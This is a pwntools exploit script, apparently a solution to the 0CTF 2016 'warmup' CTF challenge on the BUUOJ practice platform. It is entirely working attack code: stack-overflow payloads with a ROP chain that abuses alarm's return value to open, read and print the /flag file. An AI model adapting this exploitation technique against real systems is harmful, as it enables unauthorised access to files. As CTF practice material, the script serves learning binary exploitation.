# -*- encoding: utf-8 -*-
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './warmup'
elf = ELF(binary)
#libc = elf.libc
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28201'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)


alarm_addr = 0x0804810D
read_addr  = 0x0804811D
write_addr = 0x08048135
mian_addr  = 0x0804815A
data_addr  = 0x080491BC
syscall    = 0x0804813A


payload = "a"*0x20 + p32(read_addr) + p32(mian_addr) + p32(0) + p32(data_addr) + p32(0x10)

#首先输入flag文件名到data段
sa("Welcome to 0CTF 2016!", payload )
sa("Good Luck!","/flag".ljust(0x10,"\x00"))

#等待5s让 alarm 返回5给eax ，之后马上执行系统调用 open 打开文件flag
sleep(5)
payload = "a"*0x20 + p32(alarm_addr) + p32(syscall) + p32(mian_addr) + p32(data_addr) + p32(0)
se(payload)

#读入flag到data段
payload = "a"*0x20 + p32(read_addr) + p32(mian_addr) + p32(3) + p32(data_addr) + p32(0x50)
sa("Good Luck!", payload )

#读出flag到标准输出1
payload = "a"*0x20 + p32(write_addr) + p32(mian_addr) + p32(1) + p32(data_addr) + p32(0x50)
sa("Good Luck!", payload )


p.interactive()

'''
@File    :   warmup.py
@Time    :   2021/07/18 17:09:37
@Author  :   Niyah 
'''